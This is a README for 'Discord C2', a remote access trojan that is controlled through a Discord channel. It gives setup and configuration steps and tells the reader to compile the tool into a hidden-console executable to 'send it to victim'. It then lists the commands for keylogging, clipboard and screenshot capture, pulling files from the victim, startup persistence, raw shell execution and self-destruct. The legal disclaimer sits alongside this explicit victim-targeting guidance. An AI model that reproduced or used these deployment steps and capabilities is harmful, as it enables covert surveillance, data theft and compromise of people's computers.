# 🕹️ Discord C2 – Multi‑Session Remote Administration Tool

**Discord C2** is a remote administration tool (RAT) that uses Discord as its command & control (C2) channel. It allows an authorized operator to control multiple target machines through a single Discord channel. The bot supports file system operations, process management, keylogging, screenshots, persistence, and system shell execution.

> **⚠️ Legal Notice**  
> This tool is intended **only** for authorized security testing, educational research, and helping system administrators manage their own infrastructure with explicit written permission.  
> Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.

---

# Commands
**Discord C2 Commands (@Huzaifa818)** 

**✅ How to Use**
1-`git clone https://github.com/huzaifa818/Discord-c2.git `

#Install dependencies: ` pip install discord.py pyautogui pyperclip psutil pynput pillow `

#Replace BOT_TOKEN, CHANNEL_ID, ALLOWED_USER_IDS with your own.

# CONFIG THESE IN discord_c2.py 

BOT_TOKEN = "your_bot_token_here"          # Discord bot token
CHANNEL_ID = 123456789012345678            # integer, channel ID where bot listens
ALLOWED_USER_IDS = [987654321098765432]    # your Discord user ID(s)

# COMPILE IT INTO AN EXE BY USING PYINSTALLER And send it to victim:

Command = ` pyinstaller --noconsole --onefile --icon=Icon1.ico discord_c2.py `

**In your Discord channel:**

!list – see all online machines (their IDs). (First step)

!select PC1_John – choose which machine to control. (Second step)

Then use !shell whoami, !screenshot, etc. – commands affect the selected machine.

Persistence – run !persist on each machine once. It will survive reboots.

Self destruct – !self_destruct deletes the executable from the target. 

**Session Management**  
`!list` – Show all connected implants  
`!select <id>` – Choose active implant  
`!exec <id> <cmd>` – Run command on specific implant  

**Other**  
`!persist` – Install persistence  
`!keylog_start/stop/dump`  
`!clip` – Clipboard  
`!screenshot`  
`!ps`, `!kill`  
`!sysinfo`  
`!self_destruct`  
`!shell <command>` – Raw command  
`!ping` – Latency  
"""

**Filesystem**  
`!pwd` – Show current directory  
`!cd <path>` – Change directory  
`!ls [path]` – List directory contents  
`!tree [path]` – Directory tree  
`!rm <file>` – Delete file  
`!rmdir <dir>` – Delete directory  

**File Transfer**  
`!download <path>` – Download file from victim  
`!upload` – Attach file to upload to victim  

**Persistence**  
`!persist` – Install startup persistence  

**Keylogger**  
`!keylog_start` – Start keylogger  
`!keylog_stop` – Stop  
`!keylog_dump` – Retrieve keystrokes  

**Clipboard**  
`!clip` – Get current clipboard text  

**Screenshot**  
`!screenshot` – Capture screen  

**Processes**  
`!ps` – List processes  
`!kill <pid|name>` – Terminate process  

**System**  
`!sysinfo` – Show system information  

**Self‑destruct**  
`!self_destruct` – Delete executable  

**Raw command**  
`!shell <command>` – Execute any shell command  

**Utility**  
`!ping` – Check latency 
